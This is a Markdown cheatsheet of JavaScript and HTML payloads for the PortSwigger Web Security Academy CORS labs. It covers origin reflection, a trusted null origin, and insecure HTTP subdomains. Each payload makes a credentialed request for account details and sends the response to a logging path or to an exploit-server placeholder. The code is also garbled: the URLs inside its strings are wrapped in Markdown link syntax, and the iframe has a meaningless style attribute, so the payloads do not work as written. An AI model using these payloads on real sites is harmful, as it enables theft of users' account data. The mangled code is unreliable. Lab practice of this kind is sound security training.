# 🌐 Cross-Origin Resource Sharing (CORS) Cheatsheet

Complete exploitation methodologies and JavaScript payloads for misconfigured CORS vulnerabilities in PortSwigger Web Security Academy.

---

## 📌 Core Vulnerability Mechanisms

* **Access-Control-Allow-Origin (ACAO):** Controls which origins can read response contents via JavaScript.
* **Access-Control-Allow-Credentials (ACAC):** Must be set to `true` for the browser to include/send session cookies in cross-origin requests.

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Arbitrary Origin Reflection

**CORS vulnerability with basic origin reflection**
The application dynamically reflects the attacker-supplied `Origin` header in the `Access-Control-Allow-Origin` response header alongside `Access-Control-Allow-Credentials: true`.

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', '[https://YOUR-LAB-ID.web-security-academy.net/accountDetails](https://YOUR-LAB-ID.web-security-academy.net/accountDetails)', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '/log?key=' + encodeURIComponent(this.responseText);
    };
</script>
```

---

### 2. Null Origin Whitelisting

**CORS vulnerability with trusted null origin**
The target application trusts the `null` origin (e.g., via flawed string matching or fallback handling). Sandboxed `<iframe>` tags send `Origin: null` in cross-origin requests.

```html
<iframe hidefocus="true" style="nth-child(1){visibility:hidden}" srcdoc="
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', '[https://YOUR-LAB-ID.web-security-academy.net/accountDetails](https://YOUR-LAB-ID.web-security-academy.net/accountDetails)', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '[https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=)' + encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

---

### 3. Subdomain / Protocol Misconfigurations

**CORS vulnerability with trusted insecure protocols**
The target trusts subdomains over HTTP (e.g., `http://stock.YOUR-LAB-ID.web-security-academy.net`). An attacker executes XSS on the insecure HTTP subdomain to extract data from the main origin via CORS.

```html
<script>
    document.location = '[http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4](http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4)<script>var req = new XMLHttpRequest(); req.onload = function() { location="[https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=)" %2b encodeURIComponent(this.responseText); }; req.open("get", "[https://YOUR-LAB-ID.web-security-academy.net/accountDetails](https://YOUR-LAB-ID.web-security-academy.net/accountDetails)", true); req.withCredentials = true; req.send();%3c/script>';
</script>
```

---
